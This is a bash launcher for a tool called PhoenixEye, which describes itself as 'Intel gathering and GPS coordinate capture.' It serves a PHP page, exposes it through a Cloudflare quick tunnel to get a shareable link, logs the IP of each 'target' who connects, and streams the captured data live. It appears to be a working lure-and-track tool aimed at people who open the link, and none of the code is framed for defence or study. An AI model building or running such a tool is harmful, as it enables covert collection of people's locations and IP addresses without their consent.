#!/bin/bash
# PhoenixEye — animated launcher

# disable ^C echo for this session
stty -echoctl 2>/dev/null

cleanup() {
  stty echoctl 2>/dev/null
  killall -2 php cloudflared 2>/dev/null
  printf "\n  \e[1;91mstopped\e[0m\n"
  exit 0
}
trap cleanup INT TERM

R=$'\e[0m'; D=$'\e[1;90m'; G=$'\e[1;92m'; Y=$'\e[1;93m'
M=$'\e[1;95m'; C=$'\e[1;96m'; W=$'\e[1;97m'; X=$'\e[1;91m'

banner() {
  clear
  printf "\n"
  frames=(
    '                   \e[1;31m▄▄████▄▄\e[0m'
    '                \e[1;31m▄████\e[0m\e[1;93m██████\e[0m\e[1;31m████▄\e[0m'
    '              \e[1;31m▄██\e[0m\e[1;93m████████████\e[0m\e[1;31m██▄\e[0m'
    '              \e[1;31m██\e[0m\e[1;93m████\e[0m\e[1;30m████████\e[0m\e[1;93m████\e[0m\e[1;31m██\e[0m'
    '             \e[1;31m██\e[0m\e[1;93m██\e[0m\e[1;30m████\e[0m\e[1;91m████\e[0m\e[1;30m████\e[0m\e[1;93m██\e[0m\e[1;31m██\e[0m'
    '             \e[1;31m██\e[0m\e[1;93m██\e[0m\e[1;30m████\e[0m\e[1;91m████\e[0m\e[1;30m████\e[0m\e[1;93m██\e[0m\e[1;31m██\e[0m'
    '             \e[1;31m██\e[0m\e[1;93m████\e[0m\e[1;30m████████\e[0m\e[1;93m████\e[0m\e[1;31m██\e[0m'
    '              \e[1;31m▀██\e[0m\e[1;93m████████████\e[0m\e[1;31m██▀\e[0m'
    '                \e[1;31m▀████\e[0m\e[1;93m██████\e[0m\e[1;31m████▀\e[0m'
    '                   \e[1;31m▀▀████▀▀\e[0m'
  )
  for f in "${frames[@]}"; do
    printf "  %b\n" "$f"
    sleep 0.04
  done
  printf "\n"
  for i in 1 2 3; do
    printf "\r                ${X}P H O E N I X E Y E${R}"; sleep 0.10
    printf "\r                ${Y}P H O E N I X E Y E${R}"; sleep 0.10
    printf "\r                ${C}P H O E N I X E Y E${R}"; sleep 0.10
    printf "\r                ${W}P H O E N I X E Y E${R}"; sleep 0.10
  done
  printf "\n"
  printf "     ${M}Intel gathering and GPS coordinate capture.${R}\n"
  printf "\n"
}

loader() {
  local label="$1"
  local spin=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
  local i=0
  while :; do
    printf "\r  ${C}${spin[$i]}${R} ${W}%s${R}" "$label"
    i=$(( (i+1) % 10 ))
    sleep 0.08
  done
}

banner

command -v php >/dev/null 2>&1 || { echo "php required"; exit 1; }

# show menu
printf "  ${M}1${R}  ${W}Cloudflared Tunnel${R}\n"
printf "  ${M}2${R}  ${W}Loopback Address${R}\n"
printf "\n"
printf "  ${M}»${R} "
read -r choice

# erase ONLY the two options + blank line + prompt (4 lines)
printf "\e[2K\r\e[1A\e[2K\r\e[1A\e[2K\r\e[1A\e[2K\r\e[1A"

# ensure cursor is on a clean line
printf "\e[2K"

if [[ "$choice" == "1" ]]; then
    loader "opening tunnel" &
    LPID=$!
    command -v wget >/dev/null 2>&1 || { kill $LPID 2>/dev/null; printf "\r\e[2K"; echo "  wget required"; exit 1; }

    [[ -x ./cloudflared ]] || {
        arch=$(uname -m)
        case "$arch" in
            *aarch64*) url=cloudflared-linux-arm64 ;;
            *arm*)     url=cloudflared-linux-arm   ;;
            *x86_64*)  url=cloudflared-linux-amd64 ;;
            *)         url=cloudflared-linux-386   ;;
        esac
        wget -q --no-check-certificate "https://github.com/cloudflare/cloudflared/releases/latest/download/$url" -O cloudflared
        chmod +x cloudflared
    }

    php -S 127.0.0.1:3333 >/dev/null 2>&1 &
    sleep 1
    rm -f cf.log
    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log >/dev/null 2>&1 &
    sleep 8

    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' cf.log)
    kill $LPID 2>/dev/null
    wait $LPID 2>/dev/null
    printf "\r\e[2K"
    printf "  ${C}Link${R} ${D}-${R} ${W}%s${R}\n" "${link:-no link}"
    sed "s+forwarding_link+${link:-}+g" template.php > index.php 2>/dev/null

elif [[ "$choice" == "2" ]]; then
    loader "starting server" &
    LPID=$!
    php -S 127.0.0.1:8080 >/dev/null 2>&1 &
    sleep 1
    kill $LPID 2>/dev/null
    wait $LPID 2>/dev/null
    printf "\r\e[2K"
    printf "  ${C}Link${R} ${D}-${R} ${W}http://127.0.0.1:8080${R}\n"
    sed 's+forwarding_link++g' template.php > index.php 2>/dev/null

else
    printf "  invalid\n"
    exit 1
fi

printf "\n"
printf "  ${D}waiting for capturing information..${R}\n"
printf "\n"

while :; do
    if [[ -e phoenix_ip.txt ]]; then
        printf "  ${G}●${R} ${W}target connected${R}\n"
        cat phoenix_ip.txt >> phoenix_saved_ip.txt
        rm -f phoenix_ip.txt
        printf "  ${C}── live report ──${R}\n"
        tail -f phoenix_data.txt
    fi
    sleep 1
done
